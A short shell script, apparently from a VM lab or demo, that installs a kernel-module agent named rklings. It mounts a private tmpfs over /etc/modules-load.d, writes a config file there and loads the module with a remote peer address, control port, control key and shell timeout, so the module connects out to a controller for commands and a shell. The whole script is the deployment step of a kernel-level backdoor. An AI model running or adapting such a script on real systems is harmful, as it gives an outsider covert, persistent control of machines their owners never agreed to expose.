#!/bin/sh

set -eu

# shellcheck source=scripts/lib/ui.sh
. /vm/ui.sh

key=${1:-}
peer=${2:-}
control_port=${3:-}
shell_port=${4:-}

show()
{
	ui_transcript "$*"
}

run()
{
	show "$@"
	"$@"
}

ui_heading 'Completed authenticated agent'
ui_field 'Control peer' "$peer:$control_port"
ui_field 'Shell peer' "$peer:$shell_port"

run mkdir -p /etc/modules-load.d
run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
	/etc/modules-load.d
run chmod 0700 /etc/modules-load.d
show "printf 'original-request\\n' > /etc/modules-load.d/rklings.conf"
printf 'original-request\n' > /etc/modules-load.d/rklings.conf
run chmod 0600 /etc/modules-load.d/rklings.conf
command='insmod /rklings/rklings.ko'
command="$command peer_address=$peer peer_port=$control_port"
command="$command retry_base_ms=25 retry_max_ms=200"
command="$command control_key=<redacted> shell_timeout_ms=300000"
show "$command"
insmod /rklings/rklings.ko \
	"peer_address=$peer" \
	"peer_port=$control_port" \
	retry_base_ms=25 \
	retry_max_ms=200 \
	"control_key=$key" \
	shell_timeout_ms=300000
run cat /proc/rklings_agent
